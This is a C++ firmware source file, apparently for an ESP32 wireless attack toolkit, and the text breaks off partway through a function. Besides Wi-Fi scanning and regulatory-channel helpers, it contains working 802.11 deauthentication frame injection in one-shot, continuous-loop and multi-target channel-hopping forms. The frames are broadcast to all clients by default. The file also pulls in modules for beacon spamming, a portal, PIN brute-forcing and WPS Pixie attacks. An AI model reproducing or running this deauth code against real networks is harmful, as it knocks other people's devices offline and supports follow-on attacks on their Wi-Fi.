#include <Arduino.h>
#include "NrDebugLog.h"
#include <algorithm>
#include <cmath>
#include <cstdio>
#include <ArduinoJson.h>
#include <soc/soc_caps.h>
#include <esp_wifi.h>
#include "BridgeProtocol.h"
#include "sniffer.h"
#include "portal.h"
#include "beacon.h"
#include "deauth_detector.h"
#include "DeauthMultiRules.h"
#include "hidden_ap.h"
#include "mesh.h"
#include "pin_bruteforce.h"
#include "ld2450.h"
#include "ir_remote.h"
#include "pn532_nfc.h"
#include "wps_pixie.h"
#include "wps_lock_detector.h"
#include "wps_attempt_detector.h"
#include "scan_results.h"
#include "mbedtls/base64.h"
#include "Preferences.h"

#define FW_VERSION "1.0.0-rc.2"

#ifndef NRSUITE_ENABLE_NRUGOCHI
#define NRSUITE_ENABLE_NRUGOCHI 1
#endif

#ifndef LD2450_BOOT_START
#define LD2450_BOOT_START 0
#endif
#ifndef LD2450_BOOT_DEBUG
#define LD2450_BOOT_DEBUG 0
#endif

#ifdef ENABLE_BLE_HID
#include "ble_hid.h"
#include "ble_scanner.h"
#include "ble_profile.h"
#include "ble_pin_bruteforce.h"
#endif

#if defined(CONFIG_IDF_TARGET_ESP32)
extern "C" uint8_t temprature_sens_read();
#elif defined(SOC_TEMP_SENSOR_SUPPORTED)
#include "driver/temperature_sensor.h"
#endif

#if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
    #define MSC_SUPPORTED 1
    #define HID_SUPPORTED 1
    #include "mass_storage.h"
    #include "FileUpload.h"
    #include "UsbHID.h"
#else
    #define MSC_SUPPORTED 0
    #define HID_SUPPORTED 0
#endif


// ── Chip name ────────────────────────────────────────────────────────────────
#if defined(CONFIG_IDF_TARGET_ESP32C3)
    #define CHIP_NAME "ESP32-C3"
#elif defined(CONFIG_IDF_TARGET_ESP32C5)
    #define CHIP_NAME "ESP32-C5"
#elif defined(CONFIG_IDF_TARGET_ESP32S3)
    #define CHIP_NAME "ESP32-S3"
#elif defined(CONFIG_IDF_TARGET_ESP32S2)
    #define CHIP_NAME "ESP32-S2"
    #define LED_PIN 17
#else
    #define CHIP_NAME "ESP32"
#endif

#if defined(CONFIG_IDF_TARGET_ESP32S2) || \
    defined(CONFIG_IDF_TARGET_ESP32S3) || \
    defined(CONFIG_IDF_TARGET_ESP32C3) || \
    defined(CONFIG_IDF_TARGET_ESP32C5) || \
    defined(CONFIG_IDF_TARGET_ESP32C6)
    #define NRSUITE_HAS_NATIVE_USB 1
#else
    #define NRSUITE_HAS_NATIVE_USB 0
#endif

#if NRSUITE_HAS_NATIVE_USB
BridgeProtocol proto(Serial, "usb_cdc");
#else
BridgeProtocol proto(Serial, "uart0");
#endif
Sniffer        sniffer;
#if NRSUITE_ENABLE_PORTAL
PortalManager  portal;
#endif
BeaconSpammer  beacon;
DeauthDetector deauthDetector;
HiddenApDetector hiddenApDetector;
MeshManager    mesh;
Ld2450         ld2450;
IrRemote       irRemote;
Pn532Nfc       pn532Nfc;
WpsPixieManager wpsPixie;
WpsLockDetector wpsLockDetector;
WpsAttemptDetector wpsAttemptDetector;
ScanResultStore scanResults;
static uint32_t g_nextScanId = 1;
#ifdef ENABLE_BLE_HID
BleScanner bleScanner;
BleProfile bleProfile;
#endif

// ── Persistent device ID ─────────────────────────────────────────────────────
static String getDeviceId() {
    static String cached;
    if (!cached.isEmpty()) return cached;

    Preferences prefs;
    if (prefs.begin("nrsuite", false)) {
        cached = prefs.getString("device_id", "");
        if (cached.isEmpty()) {
            char buf[16];
            snprintf(buf, sizeof(buf), "NR%08X", (unsigned)esp_random());
            cached = buf;
            prefs.putString("device_id", cached);
        }
        prefs.end();
    }

    if (cached.isEmpty()) cached = "NR00000000";
    return cached;
}

// ── Internal chip temperature ────────────────────────────────────────────────
#if defined(CONFIG_IDF_TARGET_ESP32)
static bool readChipTemperatureC(float& outCelsius) {
    // Classic ESP32 has an internal sensor but the current Arduino/IDF target
    // does not link the official temperature-sensor driver. This ROM-backed
    // value is best-effort only.
    const float celsius = (temprature_sens_read() - 32.0f) / 1.8f;
    if (!std::isfinite(celsius) || celsius < -40.0f || celsius > 125.0f) {
        return false;
    }
    outCelsius = celsius;
    return true;
}
#elif defined(SOC_TEMP_SENSOR_SUPPORTED)
static temperature_sensor_handle_t gTempSensor = nullptr;
static bool gTempSensorInitAttempted = false;

static bool readChipTemperatureC(float& outCelsius) {
    if (!gTempSensorInitAttempted) {
        gTempSensorInitAttempted = true;
        temperature_sensor_config_t config =
            TEMPERATURE_SENSOR_CONFIG_DEFAULT(-10, 80);
        esp_err_t err = temperature_sensor_install(&config, &gTempSensor);
        if (err != ESP_OK) {
            // Fall back to the range used by Arduino's temperatureRead().
            config = TEMPERATURE_SENSOR_CONFIG_DEFAULT(10, 50);
            err = temperature_sensor_install(&config, &gTempSensor);
        }
        if (err == ESP_OK && temperature_sensor_enable(gTempSensor) != ESP_OK) {
            temperature_sensor_uninstall(gTempSensor);
            gTempSensor = nullptr;
        }
    }
    if (gTempSensor == nullptr) return false;

    float celsius = NAN;
    if (temperature_sensor_get_celsius(gTempSensor, &celsius) != ESP_OK) {
        return false;
    }
    if (!std::isfinite(celsius) || celsius < -40.0f || celsius > 125.0f) {
        return false;
    }
    outCelsius = celsius;
    return true;
}
#else
static bool readChipTemperatureC(float&) {
    return false;
}
#endif

// ── IDF-level scan ───────────────────────────────────────────────────────────
#if NRSUITE_ENABLE_PORTAL
static uint16_t g_lastHtmlSeq = 0xFFFF;
#endif


enum class WifiBandMode : uint8_t {
    BAND_2G = 0,
    BAND_5G,
    AUTO,
};

static const uint8_t WIFI_5G_CHANNELS[] = {
    36, 40, 44, 48, 52, 56, 60, 64,
    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144,
    149, 153, 157, 161, 165, 169, 173, 177,
};

static bool isWifi5GhzEnabled() {
#if defined(CONFIG_IDF_TARGET_ESP32C5)
    return true;
#else
    return false;
#endif
}

static bool isValidWifiChannel(uint8_t channel) {
    if (channel >= 1 && channel <= 14) return true;
    for (uint8_t ch : WIFI_5G_CHANNELS) {
        if (ch == channel) return true;
    }
    return false;
}

static const char* wifiBandForChannel(uint8_t channel) {
    return channel >= 36 ? "5g" : "2g";
}

static const char* wifiBandModeName(WifiBandMode mode) {
    switch (mode) {
        case WifiBandMode::BAND_2G: return "2g";
        case WifiBandMode::BAND_5G: return "5g";
        case WifiBandMode::AUTO: return "auto";
    }
    return "2g";
}

static int wifi5gChannelBit(uint8_t channel) {
    switch (channel) {
        case 36: return 1;
        case 40: return 2;
        case 44: return 3;
        case 48: return 4;
        case 52: return 5;
        case 56: return 6;
        case 60: return 7;
        case 64: return 8;
        case 100: return 9;
        case 104: return 10;
        case 108: return 11;
        case 112: return 12;
        case 116: return 13;
        case 120: return 14;
        case 124: return 15;
        case 128: return 16;
        case 132: return 17;
        case 136: return 18;
        case 140: return 19;
        case 144: return 20;
        case 149: return 21;
        case 153: return 22;
        case 157: return 23;
        case 161: return 24;
        case 165: return 25;
        case 169: return 26;
        case 173: return 27;
        case 177: return 28;
        default: return -1;
    }
}

static bool isChannelAllowedByCountry(uint8_t channel) {
    wifi_country_t country = {};
    if (esp_wifi_get_country(&country) != ESP_OK) return true;

    if (channel >= 1 && channel <= 14) {
        if (country.nchan == 0) return true;
        return channel >= country.schan &&
               channel < (uint16_t)country.schan + (uint16_t)country.nchan;
    }

#if CONFIG_SOC_WIFI_SUPPORT_5G
    if (!isWifi5GhzEnabled()) return false;
    const int bit = wifi5gChannelBit(channel);
    if (bit < 0) return false;
    // A zero mask means the local regulatory rules allow the 5 GHz channels.
    if (country.wifi_5g_channel_mask == 0) return true;
    return (country.wifi_5g_channel_mask & (1u << bit)) != 0;
#else
    return false;
#endif
}

static String regulatoryChannelError(uint8_t channel) {
    char cc[4] = {0};
    esp_wifi_get_country_code(cc);
    String error = "channel ";
    error += channel;
    error += " is not allowed by regulatory country ";
    error += (cc[0] ? cc : "CH");
    return error;
}

static bool validateRegulatoryChannel(uint8_t channel, String& error) {
    if (isChannelAllowedByCountry(channel)) return true;
    error = regulatoryChannelError(channel);
    return false;
}

static void appendAllowedWifiChannels(JsonDocument& doc) {
    JsonArray channels2g = doc["allowed_2ghz_channels"].to<JsonArray>();
    const uint8_t max2g = 14;
    for (uint8_t channel = 1; channel <= max2g; channel++) {
        if (isChannelAllowedByCountry(channel)) channels2g.add(channel);
    }

    JsonArray channels5g = doc["allowed_5ghz_channels"].to<JsonArray>();
    if (isWifi5GhzEnabled()) {
        for (uint8_t channel : WIFI_5G_CHANNELS) {
            if (isChannelAllowedByCountry(channel)) channels5g.add(channel);
        }
    }
}

static void applyStoredWifiCountry() {
    Preferences prefs;
    String country = "CH";
    if (prefs.begin("nrsuite", true)) {
        country = prefs.getString("wifi_country", "CH");
        prefs.end();
    }
    country.trim();
    country.toUpperCase();
    if (country.length() != 2) country = "CH";
    const esp_err_t err = esp_wifi_set_country_code(country.c_str(), false);
    if (err != ESP_OK) {
        NRSUITE_DEBUG_PRINTF("WiFi country %s rejected: %s (%d)\n",
                      country.c_str(), esp_err_to_name(err), (int)err);
        esp_wifi_set_country_code("CH", false);
    }
}

static bool configureWifiBand(
    const char* band,
    WifiBandMode& mode,
    String& error,
    bool applyHardwareMode = true
) {
    const bool fiveSupported = isWifi5GhzEnabled();

    if (strcmp(band, "auto") == 0) {
        mode = fiveSupported ? WifiBandMode::AUTO : WifiBandMode::BAND_2G;
    } else if (strcmp(band, "2g") == 0 || strcmp(band, "2.4g") == 0) {
        mode = WifiBandMode::BAND_2G;
    } else if (strcmp(band, "5g") == 0) {
        if (!fiveSupported) {
            error = "5 GHz is not enabled in this firmware build";
            return false;
        }
        mode = WifiBandMode::BAND_5G;
    } else {
        error = "unsupported band";
        return false;
    }

    #if defined(CONFIG_IDF_TARGET_ESP32C5)
        if (applyHardwareMode) {
            esp_err_t err;
            if (mode == WifiBandMode::AUTO) {
                err = esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
            } else if (mode == WifiBandMode::BAND_5G) {
                err = esp_wifi_set_band_mode(WIFI_BAND_MODE_5G_ONLY);
            } else {
                err = esp_wifi_set_band_mode(WIFI_BAND_MODE_2G_ONLY);
            }
            if (err != ESP_OK) {
                error = "band mode setup failed: ";
                error += esp_err_to_name(err);
                return false;
            }
            delay(80);
        }
    #endif
    return true;
}

static bool g_wifiScanInProgress = false;
static uint32_t g_lastWifiScanEndMs = 0;
static uint16_t g_lastWifiScanGoodCount = 0;
static uint32_t g_lastWifiScanGoodMs = 0;
static constexpr uint32_t WIFI_SCAN_DEFAULT_SETTLE_MS = 900;
static constexpr uint32_t WIFI_SCAN_MIN_SETTLE_MS = 250;
static constexpr uint32_t WIFI_SCAN_MAX_SETTLE_MS = 5000;
static constexpr uint16_t WIFI_SCAN_MIN_DWELL_MS = 200;
static constexpr uint16_t WIFI_SCAN_MAX_DWELL_MS = 1000;
static constexpr uint32_t WIFI_SCAN_LOW_RESULT_WINDOW_MS = 60000;
static constexpr uint8_t WIFI_SCAN_MAX_ATTEMPTS = 3;

#if defined(CONFIG_IDF_TARGET_ESP32)
// Classic ESP32 scans are noticeably less reliable with short active dwell
// times. Give each channel a full 500 ms by default.
static constexpr uint16_t WIFI_SCAN_DEFAULT_DWELL_MS = 500;
#else
static constexpr uint16_t WIFI_SCAN_DEFAULT_DWELL_MS = 300;
#endif

static bool scanResultLooksLow(uint16_t count) {
    if (count == 0) return true;
    if (g_lastWifiScanGoodCount < 3) return false;
    if (millis() - g_lastWifiScanGoodMs > WIFI_SCAN_LOW_RESULT_WINDOW_MS) return false;
    uint16_t lowThreshold = g_lastWifiScanGoodCount / 2;
    if (lowThreshold < 2) lowThreshold = 2;
    return count < lowThreshold;
}

static void finishWifiScan(bool stopScan) {
    if (stopScan) esp_wifi_scan_stop();
    g_wifiScanInProgress = false;
    g_lastWifiScanEndMs = millis();
}

// Returns the number of APs found, or -1 on failure. The caller must call
// finishWifiScan() after reading records on success. A concurrent scan request
// returns -2 without disturbing the active one.
static int idf_scan_networks(
    BridgeProtocol& proto,
    WifiBandMode bandMode,
    uint32_t settleMs,
    uint16_t dwellMs
) {
    (void)proto;

    if (g_wifiScanInProgress) {
        NRSUITE_DEBUG_PRINTLN("SCAN_WIFI: rejected because another scan is already in progress");
        return -2;
    }
    g_wifiScanInProgress = true;

    #if defined(CONFIG_IDF_TARGET_ESP32C5)
        // Keep the radio in AUTO band mode so the idle 2.4 GHz helper SoftAP
        // does not prevent the STA interface from scanning 5 GHz. The channel
        // bitmap below restricts the scan to the requested band.
        const esp_err_t bandErr = esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
        if (bandErr != ESP_OK) {
            NRSUITE_DEBUG_PRINTF(
                "SCAN_WIFI: failed to enable dual-band mode: %s (%d)\n",
                esp_err_to_name(bandErr),
                (int)bandErr
            );
            finishWifiScan(false);
            return -1;
        }
        delay(80);
    #endif

    settleMs = constrain(settleMs, WIFI_SCAN_MIN_SETTLE_MS, WIFI_SCAN_MAX_SETTLE_MS);
    const uint32_t sinceLastScanMs = millis() - g_lastWifiScanEndMs;
    if (sinceLastScanMs < settleMs) {
        const uint32_t waitMs = settleMs - sinceLastScanMs;
        NRSUITE_DEBUG_PRINTF("SCAN_WIFI: settling for %lu ms before scan\n",
                      (unsigned long)waitMs);
        delay(waitMs);
    }

    uint16_t bitmap2g = 0;
    uint32_t bitmap5g = 0;
    if (bandMode != WifiBandMode::BAND_5G) {
        for (uint8_t channel = 1; channel <= 14; ++channel) {
            if (isChannelAllowedByCountry(channel)) {
                bitmap2g |= (uint16_t)(1u << channel);
            }
        }
    }
    if (isWifi5GhzEnabled() && bandMode != WifiBandMode::BAND_2G) {
        for (uint8_t channel : WIFI_5G_CHANNELS) {
            if (!isChannelAllowedByCountry(channel)) continue;
            const int bit = wifi5gChannelBit(channel);
            if (bit > 0) bitmap5g |= (1u << bit);
        }
    }

    wifi_scan_config_t cfg = {};
    cfg.ssid        = nullptr;
    cfg.bssid       = nullptr;
    cfg.channel     = 0;
    cfg.show_hidden = true;
    cfg.scan_type   = bandMode == WifiBandMode::BAND_5G
        ? WIFI_SCAN_TYPE_PASSIVE
        : WIFI_SCAN_TYPE_ACTIVE;
    uint16_t activeMinMs = static_cast<uint16_t>(dwellMs / 2);
    if (activeMinMs < 100) activeMinMs = 100;
    cfg.scan_time.active.min = activeMinMs;
    cfg.scan_time.active.max = dwellMs;
    cfg.scan_time.passive = dwellMs;
    cfg.channel_bitmap.ghz_2_channels = bitmap2g;
    cfg.channel_bitmap.ghz_5_channels = bitmap5g;

    NRSUITE_DEBUG_PRINTF(
        "SCAN_WIFI: band=%s bitmap2g=0x%04X bitmap5g=0x%08X type=%s "
        "settle_ms=%lu dwell_ms=%u active=%u-%u passive=%u\n",
        wifiBandModeName(bandMode),
        bitmap2g,
        bitmap5g,
        cfg.scan_type == WIFI_SCAN_TYPE_PASSIVE ? "passive" : "active",
        (unsigned long)settleMs,
        (unsigned)dwellMs,
        (unsigned)cfg.scan_time.active.min,
        (unsigned)cfg.scan_time.active.max,
        (unsigned)cfg.scan_time.passive
    );

    for (uint8_t attempt = 1; attempt <= WIFI_SCAN_MAX_ATTEMPTS; ++attempt) {
        // Clear any stale scan state left by a previous failed/aborted scan.
        esp_wifi_scan_stop();
        delay(50);

        const uint32_t startedAt = millis();
        NRSUITE_DEBUG_PRINTF("SCAN_WIFI: esp_wifi_scan_start attempt %u/%u\n",
                      (unsigned)attempt, (unsigned)WIFI_SCAN_MAX_ATTEMPTS);
        esp_err_t err = esp_wifi_scan_start(&cfg, true);
        if (err != ESP_OK) {
            NRSUITE_DEBUG_PRINTF(
                "SCAN_WIFI: esp_wifi_scan_start attempt %u failed: %s (%d)\n",
                (unsigned)attempt,
                esp_err_to_name(err),
                (int)err
            );
            if (attempt < WIFI_SCAN_MAX_ATTEMPTS &&
                (err == ESP_ERR_WIFI_STATE || err == ESP_ERR_WIFI_NOT_STARTED)) {
                esp_wifi_scan_stop();
                delay(settleMs);
                continue;
            }
            finishWifiScan(false);
            return -1;
        }

        uint16_t count = 0;
        err = esp_wifi_scan_get_ap_num(&count);
        if (err != ESP_OK) {
            NRSUITE_DEBUG_PRINTF(
                "SCAN_WIFI: esp_wifi_scan_get_ap_num attempt %u failed: %s (%d)\n",
                (unsigned)attempt,
                esp_err_to_name(err),
                (int)err
            );
            if (attempt < WIFI_SCAN_MAX_ATTEMPTS) {
                esp_wifi_scan_stop();
                delay(settleMs);
                continue;
            }
            finishWifiScan(false);
            return -1;
        }

        const bool lowResult = scanResultLooksLow(count);
        NRSUITE_DEBUG_PRINTF(
            "SCAN_WIFI: attempt %u complete in %lu ms, raw_count=%u "
            "last_good=%u low_result=%s\n",
            (unsigned)attempt,
            (unsigned long)(millis() - startedAt),
            (unsigned)count,
            (unsigned)g_lastWifiScanGoodCount,
            lowResult ? "yes" : "no"
        );

        if (lowResult && attempt < WIFI_SCAN_MAX_ATTEMPTS) {
            NRSUITE_DEBUG_PRINTLN(
                "SCAN_WIFI: empty/low result; retrying after settle"
            );
            esp_wifi_scan_stop();
            delay(settleMs);
            continue;
        }
        if (count > 0) {
            g_lastWifiScanGoodCount = count;
            g_lastWifiScanGoodMs = millis();
        }
        return (int)count;
    }

    finishWifiScan(false);
    return -1;
}

static bool parseMac(const char* str, uint8_t out[6]) {
    if (!str || !str[0]) return false;
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]) == 6;
}

struct DeauthTxStats {
    uint32_t requested = 0;
    uint32_t sent = 0;
    uint32_t failed = 0;
    uint32_t elapsedMs = 0;
};

static float framesPerSecond(uint32_t frames, uint32_t elapsedMs) {
    if (elapsedMs == 0) return 0.0f;
    return (static_cast<float>(frames) * 1000.0f) / static_cast<float>(elapsedMs);
}

static DeauthTxStats transmitDeauthFrames(
    const uint8_t bssid[6],
    const uint8_t client[6],
    uint32_t count,
    uint16_t intervalMs,
    uint8_t reason
) {
    DeauthTxStats stats;
    stats.requested = count;
    const uint32_t startedMs = millis();

    uint8_t deauthFrame[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x07
    };
    memcpy(deauthFrame + 4, client, 6);
    memcpy(deauthFrame + 10, bssid, 6);
    memcpy(deauthFrame + 16, bssid, 6);

    uint16_t seq = 0x0010;
    for (uint32_t i = 0; i < count; i++) {
        deauthFrame[22] = seq & 0xFF;
        deauthFrame[23] = (seq >> 8) & 0xFF;
        deauthFrame[25] = reason;
        if (esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), true) == ESP_OK) {
            stats.sent++;
        } else {
            stats.failed++;
        }
        seq += 0x0010;
        if (intervalMs > 0 && i + 1 < count) delay(intervalMs);
    }
    stats.elapsedMs = millis() - startedMs;
    return stats;
}

static volatile bool gDeauthLoopActive = false;
static volatile bool gDeauthLoopStopRequested = false;
static TaskHandle_t gDeauthLoopTaskHandle = nullptr;
static uint8_t gDeauthLoopBssid[6] = {0};
static uint8_t gDeauthLoopClient[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static uint32_t gDeauthLoopDurationSec = 0;
static uint16_t gDeauthLoopIntervalMs = 100;
static uint8_t gDeauthLoopReason = 7;
static uint32_t gDeauthLoopSent = 0;
static uint32_t gDeauthLoopFailed = 0;
static uint32_t gDeauthLoopStartedMs = 0;

static void sendDeauthLoopStatsEvent(const char* status, bool stopped) {
    JsonDocument ev;
    ev["status"] = status;
    ev["mode"] = "loop";
    ev["sent_frames"] = gDeauthLoopSent;
    ev["failed_frames"] = gDeauthLoopFailed;
    ev["duration_s"] = gDeauthLoopDurationSec;
    ev["interval_ms"] = gDeauthLoopIntervalMs;
    const uint32_t elapsedMs =
        gDeauthLoopStartedMs == 0 ? 0 : (millis() - gDeauthLoopStartedMs);
    ev["elapsed_ms"] = elapsedMs;
    ev["pps"] = framesPerSecond(gDeauthLoopSent, elapsedMs);
    ev["stopped"] = stopped;
    proto.sendEvent("deauth_stats", ev);
}

static void deauthLoopTaskFn(void*) {
    uint8_t frame[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x07
    };
    memcpy(frame + 4, gDeauthLoopClient, 6);
    memcpy(frame + 10, gDeauthLoopBssid, 6);
    memcpy(frame + 16, gDeauthLoopBssid, 6);

    const uint32_t durationMs = gDeauthLoopDurationSec * 1000UL;
    uint16_t seq = 0x0010;
    uint32_t lastStatsMs = millis();

    while (!gDeauthLoopStopRequested) {
        const uint32_t elapsedMs = millis() - gDeauthLoopStartedMs;
        if (durationMs > 0 && elapsedMs >= durationMs) break;

        frame[22] = seq & 0xFF;
        frame[23] = (seq >> 8) & 0xFF;
        frame[25] = gDeauthLoopReason;
        if (esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), true) == ESP_OK) {
            gDeauthLoopSent++;
        } else {
            gDeauthLoopFailed++;
        }
        seq += 0x0010;

        if (millis() - lastStatsMs >= 2000) {
            lastStatsMs = millis();
            sendDeauthLoopStatsEvent("running", false);
        }

        uint32_t sleepMs = gDeauthLoopIntervalMs;
        if (durationMs > 0) {
            const uint32_t remainingMs = durationMs > elapsedMs
                ? durationMs - elapsedMs
                : 0;
            if (remainingMs < sleepMs) sleepMs = remainingMs;
        }
        if (sleepMs > 0) vTaskDelay(pdMS_TO_TICKS(sleepMs));
        else vTaskDelay(pdMS_TO_TICKS(1));
    }

    gDeauthLoopActive = false;
    sendDeauthLoopStatsEvent("finished", gDeauthLoopStopRequested);
    gDeauthLoopTaskHandle = nullptr;
    vTaskDelete(nullptr);
}

static void stopDeauthLoopAndWait(uint32_t timeoutMs = 1200) {
    if (!gDeauthLoopActive && gDeauthLoopTaskHandle == nullptr) return;
    gDeauthLoopStopRequested = true;
    const uint32_t started = millis();
    while (gDeauthLoopActive && millis() - started < timeoutMs) {
        delay(10);
    }
    if (!gDeauthLoopActive) gDeauthLoopTaskHandle = nullptr;
}

// ── DEAUTH_MULTI ──────────────────────────────────────────────────────────────
struct DeauthMultiTarget {
    uint8_t bssid[6] = {};
    uint8_t channel = 0;
    uint32_t requested = 0;
    uint32_t sent = 0;
    uint32_t failed = 0;
};

static DeauthMultiTarget gDeauthMultiTargets[deauth_multi::kMaxTargets] = {};
static size_t gDeauthMultiTargetCount = 0;
static uint8_t gDeauthMultiClient[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static uint32_t gDeauthMultiCountPerTarget = 1;
static uint32_t gDeauthMultiDurationSec = 0;
static uint16_t gDeauthMultiIntervalMs = deauth_multi::kDefaultIntervalMs;
static uint8_t gDeauthMultiReason = 7;
static volatile bool gDeauthMultiActive = false;
static volatile bool gDeauthMultiStopRequested = false;
static TaskHandle_t gDeauthMultiTaskHandle = nullptr;
static uint32_t gDeauthMultiStartedMs = 0;
static uint32_t gDeauthMultiSent = 0;
static uint32_t gDeauthMultiFailed = 0;
static uint8_t gDeauthMultiCurrentChannel = 0;
static char gDeauthMultiCurrentBssid[18] = {0};

static void formatDeauthMultiMac(const uint8_t mac[6], char out[18]) {
    snprintf(
        out,
        18,
        "%02X:%02X:%02X:%02X:%02X:%02X",
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]
    );
}

static bool prepareDeauthMultiChannel(uint8_t channel, String& error) {
    if (!isValidWifiChannel(channel)) {
        error = "invalid channel";
        return false;
    }
    if (!validateRegulatoryChannel(channel, error)) {
        return false;
    }

    const char* band = channel <= 14 ? "2g" : "5g";
    WifiBandMode bandMode = WifiBandMode::BAND_2G;
    String bandError;
    if (!configureWifiBand(band, bandMode, bandError)) {
        error = bandError;
        return false;
    }

    esp_err_t setupErr = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (setupErr != ESP_OK) {
        error = "channel set failed: ";
        error += esp_err_to_name(setupErr);
        return false;
    }

    wifi_config_t apCfg = {};
    setupErr = esp_wifi_get_config(WIFI_IF_AP, &apCfg);
    if (setupErr == ESP_OK) {
        apCfg.ap.channel = channel;
        setupErr = esp_wifi_set_config(WIFI_IF_AP, &apCfg);
    }
    if (setupErr == ESP_OK) {
        setupErr = esp_wifi_start();
    }
    if (setupErr != ESP_OK && setupErr != ESP_ERR_WIFI_STATE) {
        error = "WiFi setup failed: ";
        error += esp_err_to_name(setupErr);
        return false;
    }
    delay(20);
    return true;
}

static bool sendDeauthMultiFrame(
    const DeauthMultiTarget& target,
    uint16_t sequence,
    uint8_t reason
) {
    uint8_t frame[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x07
    };
    memcpy(frame + 4, gDeauthMultiClient, 6);
    memcpy(frame + 10, target.bssid, 6);
    memcpy(frame + 16, target.bssid, 6);
    frame[22] = sequence & 0xFF;
    frame[23] = (sequence >> 8) & 0xFF;
    frame[25] = reason;
    return esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), true) == ESP_OK;
}

static uint32_t deauthMultiRequestedTotal() {
    uint32_t total = 0;
    for (size_t i = 0; i < gDeauthMultiTargetCount; ++i) {
        total += gDeauthMultiTargets[i].requested;
    }
    return total;
}

static void appendDeauthMultiTargets(JsonDocument& doc) {
    JsonArray targets = doc["targets"].to<JsonArray>();
    for (size_t i = 0; i < gDeauthMultiTargetCount; ++i) {
        const DeauthMultiTarget& target = gDeauthMultiTargets[i];
        char bssid[18];
        formatDeauthMultiMac(target.bssid, bssid);
        JsonObject entry = targets.add<JsonObject>();
        entry["bssid"] = bssid;
        entry["channel"] = target.channel;
        entry["requested_frames"] = target.requested;
        entry["sent_frames"] = target.sent;
        entry["failed_frames"] = target.failed;
    }
}

static void sendDeauthMultiStatsEvent(const char* status, bool stopped) {
    JsonDocument ev;
    ev["status"] = status;
    ev["mode"] = "multi";
    ev["target_count"] = gDeauthMultiTargetCount;
    ev["requested_frames"] = deauthMultiRequestedTotal();
    ev["sent_frames"] = gDeauthMultiSent;
    ev["failed_frames"] = gDeauthMultiFailed;
    ev["duration_s"] = gDeauthMultiDurationSec;
    ev["interval_ms"] = gDeauthMultiIntervalMs;
    ev["channel"] = gDeauthMultiCurrentChannel;
    if (gDeauthMultiCurrentBssid[0] != '\0') {
        ev["target_bssid"] = gDeauthMultiCurrentBssid;
    }
    const uint32_t elapsedMs =
        gDeauthMultiStartedMs == 0 ? 0 : (millis() - gDeauthMultiStartedMs);
    ev["elapsed_ms"] = elapsedMs;
    ev["pps"] = framesPerSecond(gDeauthMultiSent, elapsedMs);
    ev["stopped"] = stopped;
    appendDeauthMultiTargets(ev);
    proto.sendEvent("deauth_stats", ev);
}

static void deauthMultiTaskFn(void*) {
    const uint32_t durationMs = gDeauthMultiDurationSec * 1000UL;
    uint16_t sequence = 0x0010;
    uint32_t lastStatsMs = millis();

    while (!gDeauthMultiStopRequested) {
        const uint32_t cycleElapsedMs = millis() - gDeauthMultiStartedMs;
        if (durationMs > 0 && cycleElapsedMs >= durationMs) break;

        for (size_t targetIndex = 0;
             targetIndex < gDeauthMultiTargetCount && !gDeauthMultiStopRequested;
             ++targetIndex) {
            DeauthMultiTarget& target = gDeauthMultiTargets[targetIndex];
            gDeauthMultiCurrentChannel = target.channel;
            formatDeauthMultiMac(target.bssid, gDeauthMultiCurrentBssid);

            String channelError;
            if (!prepareDeauthMultiChannel(target.channel, channelError)) {
                const uint32_t attempted = gDeauthMultiCountPerTarget;
                target.requested += attempted;
                target.failed += attempted;
                gDeauthMultiFailed += attempted;
                NRSUITE_DEBUG_PRINTF(
                    "DEAUTH_MULTI: target %s channel %u setup failed: %s\n",
                    gDeauthMultiCurrentBssid,
                    target.channel,
                    channelError.c_str()
                );
                continue;
            }

            for (uint32_t frameIndex = 0;
                 frameIndex < gDeauthMultiCountPerTarget && !gDeauthMultiStopRequested;
                 ++frameIndex) {
                const uint32_t elapsedMs = millis() - gDeauthMultiStartedMs;
                if (durationMs > 0 && elapsedMs >= durationMs) break;

                target.requested++;
                if (sendDeauthMultiFrame(target, sequence, gDeauthMultiReason)) {
                    target.sent++;
                    gDeauthMultiSent++;
                } else {
                    target.failed++;
                    gDeauthMultiFailed++;
                }
                sequence += 0x0010;

                if (millis() - lastStatsMs >= 2000) {
                    lastStatsMs = millis();
                    sendDeauthMultiStatsEvent("running", false);
                }

                if (frameIndex + 1 < gDeauthMultiCountPerTarget) {
                    uint32_t sleepMs = gDeauthMultiIntervalMs;
                    if (durationMs > 0) {
                        const uint32_t nowElapsedMs = millis() - gDeauthMultiStartedMs;
                        const uint32_t remainingMs = durationMs > nowElapsedMs
                            ? durationMs - nowElapsedMs
                            : 0;
                        if (remainingMs < sleepMs) sleepMs = remainingMs;
                    }
                    if (sleepMs > 0) vTaskDelay(pdMS_TO_TICKS(sleepMs));
                    else vTaskDelay(pdMS_TO_TICKS(1));
                }
            }
        }

        if (gDeauthMultiStopRequested) break;
        if (durationMs > 0 && millis() - gDeauthMultiStartedMs >= durationMs) break;
        vTaskDelay(pdMS_TO_TICKS(1));
    }

